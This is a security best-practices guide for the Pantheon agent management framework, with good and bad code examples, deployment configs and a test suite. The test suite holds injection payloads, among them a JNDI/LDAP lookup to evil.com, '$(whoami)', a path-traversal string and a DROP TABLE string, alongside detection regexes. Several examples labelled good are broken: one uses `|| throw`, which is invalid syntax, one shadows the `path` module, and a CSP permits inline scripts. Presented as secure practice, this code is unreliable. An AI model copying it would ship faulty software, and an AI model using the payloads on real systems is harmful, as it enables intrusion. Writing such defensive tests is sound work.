# Pantheon Framework Security Best Practices Guide

## Overview

This guide provides comprehensive security best practices for developing, deploying, and operating the Pantheon Agent Management Framework. Following these practices ensures a robust security posture and protects against common attack vectors.

## Development Security Practices

### 1. Secure Coding Standards

#### Input Validation
```typescript
// ✅ GOOD: Always validate inputs with Zod schemas
import { z } from 'zod';

const AgentConfigSchema = z.object({
  agentId: AgentIdSchema,
  name: z.string().min(1).max(100),
  permissions: z.array(z.string()),
  config: z.record(z.unknown()).optional()
});

// Validate before processing
const validatedConfig = AgentConfigSchema.parse(userInput);

// ❌ BAD: Never trust user input directly
const agentId = req.body.agentId; // Vulnerable to injection
```

#### Authentication & Authorization
```typescript
// ✅ GOOD: Always validate tokens and permissions
async function handleRequest(req: Request, res: Response) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  
  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  const authToken = await authService.validateToken(token);
  if (!authToken) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  if (!authToken.permissions.includes(requiredPermission)) {
    return res.status(403).json({ error: 'Insufficient permissions' });
  }
  
  // Process request
}

// ❌ BAD: Never skip authentication checks
async function handleRequest(req: Request, res: Response) {
  // Missing authentication check
  return processRequest(req.body); // Vulnerable
}
```

#### Error Handling
```typescript
// ✅ GOOD: Secure error handling
try {
  await secureOperation();
} catch (error) {
  // Log detailed error for debugging
  SecurityLogger.log({
    type: 'error',
    severity: 'medium',
    action: 'secure_operation_failed',
    details: { 
      error: error instanceof Error ? error.message : 'Unknown error',
      stack: error instanceof Error ? error.stack : undefined
    }
  });
  
  // Return generic error to client
  return res.status(500).json({ 
    error: 'Operation failed',
    code: 'INTERNAL_ERROR'
  });
}

// ❌ BAD: Never expose sensitive information
catch (error) {
  return res.status(500).json({ 
    error: error.message,
    stack: error.stack,
    database: 'users_db' // Information disclosure
  });
}
```

### 2. Tool Development Security

#### Secure Tool Implementation
```typescript
// ✅ GOOD: Secure tool with validation and sandboxing
export class SecureFileTool {
  async execute(params: FileToolParams, context: SecurityContext): Promise<any> {
    // Validate parameters
    const validatedParams = await this.validateParams(params);
    
    // Check permissions
    if (!context.permissions.includes('file:read')) {
      throw new Error('Insufficient permissions for file operation');
    }
    
    // Validate file path
    if (!this.isAllowedPath(validatedParams.filePath, context)) {
      throw new Error('Access to path not allowed');
    }
    
    // Execute in sandbox
    return await this.executeInSandbox(validatedParams, context);
  }
  
  private isAllowedPath(path: string, context: SecurityContext): boolean {
    const resolvedPath = path.resolve(path);
    const allowedPaths = context.sandbox.allowedPaths || [];
    
    return allowedPaths.some(allowedPath => 
      resolvedPath.startsWith(path.resolve(allowedPath))
    );
  }
}

// ❌ BAD: Insecure tool with direct file access
export class InsecureFileTool {
  async execute(params: any): Promise<any> {
    // No validation
    // No permission checks
    // Direct file system access
    return fs.readFileSync(params.filePath); // Path traversal vulnerability
  }
}
```

#### Parameter Validation
```typescript
// ✅ GOOD: Comprehensive parameter validation
const ToolParametersSchema = z.object({
  filePath: z.string()
    .min(1)
    .max(255)
    .regex(/^[a-zA-Z0-9_\-\/\.]+$/, 'Invalid file path')
    .refine(path => !path.includes('..'), 'Path traversal not allowed')
    .refine(path => !path.startsWith('/'), 'Absolute paths not allowed'),
  action: z.enum(['read', 'write', 'delete']),
  content: z.string().optional()
});

// ❌ BAD: No parameter validation
const params = req.body; // Direct use without validation
```

### 3. Context Management Security

#### Secure Context Compilation
```typescript
// ✅ GOOD: Secure context compilation
export class SecureContextManager {
  async compileContext(sources: ContextSource[], context: SecurityContext): Promise<Context> {
    // Validate all sources
    for (const source of sources) {
      await this.validateSource(source, context);
    }
    
    // Compile in sandbox
    const sandbox = await this.createCompilationSandbox(context);
    return await this.compileInSandbox(sources, sandbox);
  }
  
  private async validateSource(source: ContextSource, context: SecurityContext): Promise<void> {
    // Check for malicious content
    if (source.content && this.containsMaliciousCode(source.content)) {
      throw new Error('Malicious content detected in context source');
    }
    
    // Validate source type and permissions
    if (!this.isAllowedSourceType(source.type, context)) {
      throw new Error(`Source type '${source.type}' not allowed`);
    }
  }
  
  private containsMaliciousCode(content: string): boolean {
    const maliciousPatterns = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /javascript:/gi,
      /eval\s*\(/gi,
      /Function\s*\(/gi,
      /require\s*\(/gi,
      /process\./gi
    ];
    
    return maliciousPatterns.some(pattern => pattern.test(content));
  }
}
```

## Deployment Security Practices

### 1. Environment Configuration

#### Secure Configuration Management
```typescript
// ✅ GOOD: Environment-based configuration
export const securityConfig = {
  authentication: {
    jwtSecret: process.env.JWT_SECRET || throw new Error('JWT_SECRET required'),
    tokenExpiry: process.env.JWT_EXPIRY || '1h',
    mfaRequired: process.env.NODE_ENV === 'production'
  },
  database: {
    encryptionKey: process.env.DB_ENCRYPTION_KEY || throw new Error('DB_ENCRYPTION_KEY required'),
    connectionLimit: parseInt(process.env.DB_CONNECTION_LIMIT || '10')
  },
  sandbox: {
    enabled: process.env.SANDBOX_ENABLED !== 'false',
    isolation: process.env.SANDBOX_ISOLATION || 'process',
    maxMemory: parseInt(process.env.SANDBOX_MAX_MEMORY || '536870912') // 512MB
  }
};

// ❌ BAD: Hardcoded secrets
export const config = {
  jwtSecret: 'super-secret-key', // Hardcoded secret
  dbPassword: 'password123',     // Hardcoded password
  apiKey: 'sk-1234567890'        // Hardcoded API key
};
```

#### Security Headers
```typescript
// ✅ GOOD: Comprehensive security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// Rate limiting
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP'
}));
```

### 2. Container Security

#### Secure Docker Configuration
```dockerfile
# ✅ GOOD: Secure Dockerfile
FROM node:18-alpine AS builder

# Create non-root user
RUN addgroup -g 1001 -S nodejs
RUN adduser -S pantheon -u 1001

# Set working directory
WORKDIR /app

# Copy package files
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force

# Copy application code
COPY --chown=pantheon:nodejs . .

# Switch to non-root user
USER pantheon

# Expose port
EXPOSE 3000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD curl -f http://localhost:3000/healthz || exit 1

# Start application
CMD ["node", "dist/index.js"]

# ❌ BAD: Insecure Dockerfile
FROM node:18
USER root  # Running as root
COPY . .   # Copying everything
RUN npm install
CMD ["node", "index.js"]
```

#### Kubernetes Security
```yaml
# ✅ GOOD: Secure Kubernetes deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: pantheon-framework
spec:
  replicas: 3
  selector:
    matchLabels:
      app: pantheon-framework
  template:
    metadata:
      labels:
        app: pantheon-framework
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
      containers:
      - name: pantheon
        image: pantheon/framework:latest
        ports:
        - containerPort: 3000
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        env:
        - name: JWT_SECRET
          valueFrom:
            secretKeyRef:
              name: pantheon-secrets
              key: jwt-secret
        livenessProbe:
          httpGet:
            path: /healthz
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /readyz
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5
```

### 3. Network Security

#### TLS Configuration
```typescript
// ✅ GOOD: Secure TLS configuration
import https from 'https';
import fs from 'fs';

const tlsOptions = {
  key: fs.readFileSync(process.env.TLS_KEY_PATH),
  cert: fs.readFileSync(process.env.TLS_CERT_PATH),
  ca: fs.readFileSync(process.env.TLS_CA_PATH),
  minVersion: 'TLSv1.2',
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305'
  ].join(':'),
  honorCipherOrder: true
};

const server = https.createServer(tlsOptions, app);
```

## Operational Security Practices

### 1. Monitoring and Logging

#### Security Monitoring
```typescript
// ✅ GOOD: Comprehensive security monitoring
export class SecurityMonitor {
  async monitorSecurityEvents(): Promise<void> {
    const events = await this.getRecentSecurityEvents();
    
    for (const event of events) {
      // Detect anomalies
      if (this.isAnomalous(event)) {
        await this.triggerSecurityAlert(event);
      }
      
      // Check for attack patterns
      if (this.detectAttackPattern(event)) {
        await this.blockAttacker(event);
      }
    }
  }
  
  private isAnomalous(event: SecurityLogEntry): boolean {
    // Implement anomaly detection logic
    return (
      this.detectBruteForce(event) ||
      this.detectUnusualAccess(event) ||
      this.detectResourceAbuse(event)
    );
  }
  
  private detectBruteForce(event: SecurityLogEntry): boolean {
    // Detect multiple failed authentication attempts
    const recentFailures = this.getRecentAuthFailures(event.agentId);
    return recentFailures.length > 5; // 5 failures in short time
  }
  
  private detectUnusualAccess(event: SecurityLogEntry): boolean {
    // Detect access from unusual locations or times
    const usualPatterns = this.getUsualAccessPatterns(event.agentId);
    return !usualPatterns.includes(event.ip);
  }
  
  private detectResourceAbuse(event: SecurityLogEntry): boolean {
    // Detect unusual resource consumption
    const normalUsage = this.getNormalResourceUsage(event.agentId);
    return event.details.resourcesUsed > normalUsage * 2;
  }
}
```

#### Audit Logging
```typescript
// ✅ GOOD: Comprehensive audit logging
export class AuditLogger {
  async logSecurityEvent(event: SecurityEvent): Promise<void> {
    const auditEntry = {
      timestamp: new Date().toISOString(),
      eventId: this.generateEventId(),
      eventType: event.type,
      severity: event.severity,
      agentId: event.agentId,
      action: event.action,
      details: this.sanitizeForAudit(event.details),
      ip: event.ip,
      userAgent: event.userAgent,
      sessionId: event.sessionId,
      correlationId: event.correlationId
    };
    
    // Log to secure audit store
    await this.writeToAuditStore(auditEntry);
    
    // Send to SIEM if critical
    if (event.severity === 'critical') {
      await this.sendToSIEM(auditEntry);
    }
  }
  
  private sanitizeForAudit(details: any): any {
    // Remove sensitive information from audit logs
    const sensitiveFields = ['password', 'token', 'secret', 'key', 'auth'];
    
    return JSON.parse(JSON.stringify(details, (key, value) => {
      if (sensitiveFields.some(field => key.toLowerCase().includes(field))) {
        return '[REDACTED]';
      }
      return value;
    }));
  }
}
```

### 2. Incident Response

#### Security Incident Response
```typescript
// ✅ GOOD: Automated incident response
export class IncidentResponder {
  async handleSecurityIncident(incident: SecurityIncident): Promise<void> {
    // Classify incident severity
    const severity = this.classifyIncident(incident);
    
    // Execute response plan
    switch (severity) {
      case 'critical':
        await this.handleCriticalIncident(incident);
        break;
      case 'high':
        await this.handleHighSeverityIncident(incident);
        break;
      case 'medium':
        await this.handleMediumSeverityIncident(incident);
        break;
      case 'low':
        await this.handleLowSeverityIncident(incident);
        break;
    }
  }
  
  private async handleCriticalIncident(incident: SecurityIncident): Promise<void> {
    // Immediate containment
    await this.isolateAffectedSystems(incident);
    
    // Block attacker
    await this.blockAttacker(incident.attackerIp);
    
    // Notify security team
    await this.notifySecurityTeam(incident, 'critical');
    
    // Preserve evidence
    await this.preserveEvidence(incident);
    
    // Initiate disaster recovery if needed
    if (incident.impact === 'system_compromise') {
      await this.initiateDisasterRecovery();
    }
  }
  
  private async isolateAffectedSystems(incident: SecurityIncident): Promise<void> {
    // Isolate affected agents
    for (const agentId of incident.affectedAgents) {
      await this.agentManager.isolateAgent(agentId);
    }
    
    // Block suspicious network connections
    for (const ip of incident.suspiciousIps) {
      await this.networkManager.blockIp(ip);
    }
  }
}
```

### 3. Backup and Recovery

#### Secure Backup Procedures
```typescript
// ✅ GOOD: Secure backup implementation
export class SecureBackupManager {
  async createBackup(): Promise<BackupResult> {
    const backupId = this.generateBackupId();
    
    try {
      // Create encrypted backup
      const encryptedData = await this.createEncryptedBackup();
      
      // Store in secure location
      await this.storeBackupSecurely(backupId, encryptedData);
      
      // Verify backup integrity
      const isValid = await this.verifyBackupIntegrity(backupId);
      
      if (!isValid) {
        throw new Error('Backup integrity verification failed');
      }
      
      // Log backup creation
      await this.logBackupOperation(backupId, 'created');
      
      return {
        success: true,
        backupId,
        timestamp: new Date(),
        size: encryptedData.length
      };
    } catch (error) {
      await this.logBackupOperation(backupId, 'failed', error);
      throw error;
    }
  }
  
  private async createEncryptedBackup(): Promise<Buffer> {
    // Collect data to backup
    const data = await this.collectBackupData();
    
    // Encrypt with backup key
    const encryptionKey = await this.getBackupEncryptionKey();
    const encryptedData = await this.encryptData(data, encryptionKey);
    
    return encryptedData;
  }
  
  private async storeBackupSecurely(backupId: string, data: Buffer): Promise<void> {
    // Store in multiple secure locations
    const locations = [
      's3://secure-backup-bucket',
      'gs://secure-backup-bucket',
      '/secure/local/backup'
    ];
    
    for (const location of locations) {
      await this.storeToLocation(location, backupId, data);
    }
  }
}
```

## Security Testing Practices

### 1. Automated Security Testing

#### Security Test Suite
```typescript
// ✅ GOOD: Comprehensive security testing
export class SecurityTestSuite {
  async runAllSecurityTests(): Promise<TestResults> {
    const tests = [
      this.testAuthenticationBypass(),
      this.testAuthorizationEscalation(),
      this.testInputValidation(),
      this.testInjectionAttacks(),
      this.testResourceExhaustion(),
      this.testDataExfiltration()
    ];
    
    const results = await Promise.allSettled(tests);
    
    return {
      total: tests.length,
      passed: results.filter(r => r.status === 'fulfilled').length,
      failed: results.filter(r => r.status === 'rejected').length,
      details: results
    };
  }
  
  async testInjectionAttacks(): Promise<TestResult> {
    const injectionPayloads = [
      "'; DROP TABLE users; --",
      "<script>alert('XSS')</script>",
      "../../etc/passwd",
      "$(whoami)",
      "{{7*7}}",
      "${jndi:ldap://evil.com/a}"
    ];
    
    for (const payload of injectionPayloads) {
      try {
        const result = await this.sendPayload(payload);
        
        if (this.detectSuccessfulInjection(result)) {
          return {
            passed: false,
            error: `Injection successful with payload: ${payload}`
          };
        }
      } catch (error) {
        // Expected - injection should be blocked
      }
    }
    
    return { passed: true };
  }
  
  private detectSuccessfulInjection(result: any): boolean {
    // Check for common injection indicators
    const indicators = [
      'root:',           // /etc/passwd content
      'uid=',            // User information
      'syntax error',    // SQL error
      'XSS',             // XSS success
      '49',              // 7*7 result (template injection)
    ];
    
    const resultString = JSON.stringify(result);
    return indicators.some(indicator => resultString.includes(indicator));
  }
}
```

### 2. Penetration Testing

#### Penetration Test Checklist
```yaml
# Security penetration testing checklist
authentication_tests:
  - test_weak_passwords
  - test_default_credentials
  - test_session_hijacking
  - test_token_manipulation
  - test_brute_force_protection

authorization_tests:
  - test_privilege_escalation
  - test_access_control_bypass
  - test_role_manipulation
  - test_permission_enumeration

input_validation_tests:
  - test_sql_injection
  - test_xss_attacks
  - test_command_injection
  - test_path_traversal
  - test_template_injection

infrastructure_tests:
  - test_network_security
  - test_container_security
  - test_database_security
  - test_api_security

business_logic_tests:
  - test_workflow_bypass
  - test_rate_limit_bypass
  - test_resource_exhaustion
  - test_data_exfiltration
```

## Compliance and Governance

### 1. Security Compliance Checklist

#### OWASP Top 10 Compliance
```typescript
// ✅ GOOD: OWASP compliance monitoring
export class OWASPComplianceMonitor {
  async checkCompliance(): Promise<ComplianceReport> {
    const checks = [
      this.checkA01BrokenAccessControl(),
      this.checkA02CryptographicFailures(),
      this.checkA03Injection(),
      this.checkA04InsecureDesign(),
      this.checkA05SecurityMisconfiguration(),
      this.checkA06VulnerableComponents(),
      this.checkA07AuthenticationFailures(),
      this.checkA08SoftwareDataIntegrityFailures(),
      this.checkA09LoggingMonitoringFailures(),
      this.checkA10ServerSideRequestForgery()
    ];
    
    const results = await Promise.all(checks);
    
    return {
      overallScore: this.calculateComplianceScore(results),
      details: results,
      recommendations: this.generateRecommendations(results)
    };
  }
  
  private async checkA01BrokenAccessControl(): Promise<ComplianceCheck> {
    const checks = [
      this.verifyAuthorizationEnforcement(),
      this.verifyPrivilegeEscalationProtection(),
      this.verifyMetadataProtection(),
      this.verifyCORSConfiguration()
    ];
    
    const results = await Promise.all(checks);
    const passed = results.every(r => r.passed);
    
    return {
      category: 'A01: Broken Access Control',
      passed,
      details: results
    };
  }
}
```

### 2. Security Documentation

#### Security Policy Template
```markdown
# Pantheon Framework Security Policy

## 1. Authentication Policy
- All API endpoints must require authentication
- JWT tokens must expire within 1 hour
- Multi-factor authentication required for privileged operations
- Passwords must meet complexity requirements

## 2. Authorization Policy
- Principle of least privilege must be enforced
- Role-based access control must be implemented
- Permission checks must occur before resource access
- Access rights must be regularly reviewed

## 3. Data Protection Policy
- Sensitive data must be encrypted at rest
- Data in transit must use TLS 1.2+
- Personal data must be handled according to GDPR
- Data retention policies must be enforced

## 4. Incident Response Policy
- Security incidents must be reported within 1 hour
- Critical incidents require immediate response
- All incidents must be documented and analyzed
- Post-incident reviews must be conducted

## 5. Compliance Policy
- OWASP Top 10 compliance must be maintained
- Security assessments must be conducted quarterly
- Penetration testing must be performed annually
- Compliance reports must be reviewed by management
```

## Conclusion

Following these security best practices ensures the Pantheon Agent Management Framework maintains a strong security posture while enabling secure and reliable agent operations. Regular security reviews, updates, and training are essential to maintain effectiveness against evolving threats.

---

**Last Updated**: October 20, 2025  
**Next Review**: January 20, 2026  
**Security Team**: security@promethean.ai